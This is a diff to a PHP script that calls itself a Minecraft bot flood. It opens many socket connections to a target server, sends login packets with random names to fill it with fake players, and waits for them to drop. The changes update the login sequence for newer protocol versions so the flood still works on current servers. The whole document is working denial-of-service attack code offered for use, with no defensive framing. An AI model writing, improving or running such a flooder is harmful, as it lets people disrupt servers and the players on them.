@@ -1,4 +1,5 @@
 <?php
+
 /**
  * Simple PHP Minecraft bot flood
  * 
@@ -14,14 +15,18 @@
 
 
 //Check script arguments
-$argc == 4 || exit("Usage: php $argv[0] <ip> <port> <count>");
+if ($argc != 5) {
+    echo "Usage: php $argv[0] <protoversion> <ip> <port> <count>" . PHP_EOL;
+    echo "Get protoversion from https://wiki.vg/Protocol_version_numbers" . PHP_EOL;
+    exit();
+}
 
 //Minecraft protocol version (47 = 1.8.x, 340 = 1.12.2, 498 = 1.14.4, 754 = 1.16.4 ...)
-$proto = 758;
+$proto = intval($argv[1]);
 
-$ip = $argv[1];
-$port = intval($argv[2]);
-$count = intval($argv[3]);
+$ip = $argv[2];
+$port = intval($argv[3]);
+$count = intval($argv[4]);
 
 $sockets = [];
 
@@ -59,10 +64,40 @@ for ($i = 1; $i <= $count; $i++) {
     //Make login start packet
     $data = "\x00";
     $data .= pack('c', strlen($nick)) . $nick;
+
+    // from 1.19 to < 1.19.3
+    if ($proto >= 759 && $proto < 761) {
+        // boolean disable encryption and do not send uuid
+        $data .= "\x00\x00";
+    }
+
+    // from 1.19.3 to < 1.20.2
+    if ($proto >= 761 && $proto < 764) {
+        // boolean do not send uuid
+        $data .= "\x00";
+    }
+
+    // from 1.20.2
+    if ($proto >= 764) {
+        // send empty uuid
+        $data .= generateRandomString(16);
+    }
+
     $data = pack('c', strlen($data)) . $data;
 
     //Send login start packet
     fwrite($socket,  $data);
+
+    if ($proto >= 764) {
+        usleep(100000);
+        // login ack packet
+        $data = "\x02\x00\x03";
+        fwrite($socket, $data);
+
+        // client data finish packet
+        $data = "\x02\x00\x02";
+        fwrite($socket, $data);
+    }
 }
 
 echo "\rAll $count bots connected, waiting till they drop" . PHP_EOL;
@@ -70,7 +105,8 @@ echo "\rAll $count bots connected, waiting till they drop" . PHP_EOL;
 //Wait 33 seconds till all bots are timed out
 sleep(33);
 
-function makeVarInt($data) {
+function makeVarInt($data)
+{
     if ($data < 0x80) {
         return pack('C', $data);
     }
@@ -81,13 +117,14 @@ function makeVarInt($data) {
         $data >>= 7;
     }
 
-    $bytes[count($bytes)-1] &= 0x7f;
+    $bytes[count($bytes) - 1] &= 0x7f;
 
     return call_user_func_array('pack', array_merge(array('C*'), $bytes));
 }
 
 //From: https://stackoverflow.com/questions/4356289/php-random-string-generator
-function generateRandomString($length = 10) {
+function generateRandomString($length = 10)
+{
     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
     $charactersLength = strlen($characters);
     $randomString = '';
